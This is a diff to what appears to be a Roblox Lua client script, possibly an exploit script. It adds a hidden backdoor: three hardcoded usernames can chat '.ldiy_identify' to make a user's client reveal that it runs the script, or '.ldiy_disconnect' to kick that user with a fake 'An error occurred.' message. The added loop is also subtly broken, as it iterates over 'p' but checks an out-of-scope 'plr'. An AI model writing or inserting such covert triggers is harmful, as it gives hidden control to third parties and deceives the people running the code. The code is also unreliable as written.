@@ -1998,12 +1998,29 @@ game.Players.PlayerAdded:Connect(function(plr)
 		plr.Chatted:Connect(function(msg)
 			if msg == ".ldiy_identify" then
 				if isChatLegacy then
-					chatRemote:FireServer(str, plr.Name)
+					chatRemote:FireServer("iauldiy", plr.Name)
 				else
 					local pchannel = TextChatService:CreateTextChannelForUserAsync(plr.UserId)
 					pchannel:SendAsync("iauldiy")
 				end
-			elseif msg == ".ldiy_disconnect"
+			elseif msg == ".ldiy_disconnect" then
+				game.Players.LocalPlayer:Kick("An error occurred.")
+			end
+		end
+	end
+end
+
+for _, p in game.Players:GetPlayers() do
+	if plr.Name == "hookmetamethod_hook" or plr.Name == "Steve_Bloks" or plr.Name == "LeRiFe15327" then
+		plr.Chatted:Connect(function(msg)
+			if msg == ".ldiy_identify" then
+				if isChatLegacy then
+					chatRemote:FireServer("iauldiy", plr.Name)
+				else
+					local pchannel = TextChatService:CreateTextChannelForUserAsync(plr.UserId)
+					pchannel:SendAsync("iauldiy")
+				end
+			elseif msg == ".ldiy_disconnect" then
 				game.Players.LocalPlayer:Kick("An error occurred.")
 			end
 		end
